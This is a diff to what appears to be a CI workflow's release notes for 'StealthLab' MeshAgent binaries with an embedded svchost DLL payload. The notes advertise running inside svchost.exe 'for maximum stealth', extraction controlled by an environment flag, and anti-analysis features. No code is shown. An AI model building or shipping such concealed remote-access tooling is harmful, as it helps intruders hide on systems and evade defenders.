@@ -362,12 +362,12 @@ jobs:
           This release contains **StealthLab** MeshAgent binaries with embedded svchost DLL payload:
 
           ### Files:
-          - **MeshService64.exe** (x64, ~5.7 MB) - StealthLab build with embedded DLL
+          - **MeshService64.exe** (x64, ~5.7 MB) - StealthLab build with embedded svchost payload header
           - **MeshService.exe** (x86, ~5.1 MB) - StealthLab build with embedded DLL
           - **diagsvc.dll** (2.4 MB) - Svchost DLL payload
 
           ### Features:
-          - Embedded svchost DLL payload (SVCHOSTDLL resource)
+          - Embedded svchost payload (header-based)
           -  Automatic DLL extraction when  `STEALTH_BUNDLE_EXTRACT=1` 
           - Runs inside svchost.exe for maximum stealth
           - All StealthLab anti-analysis features enabled
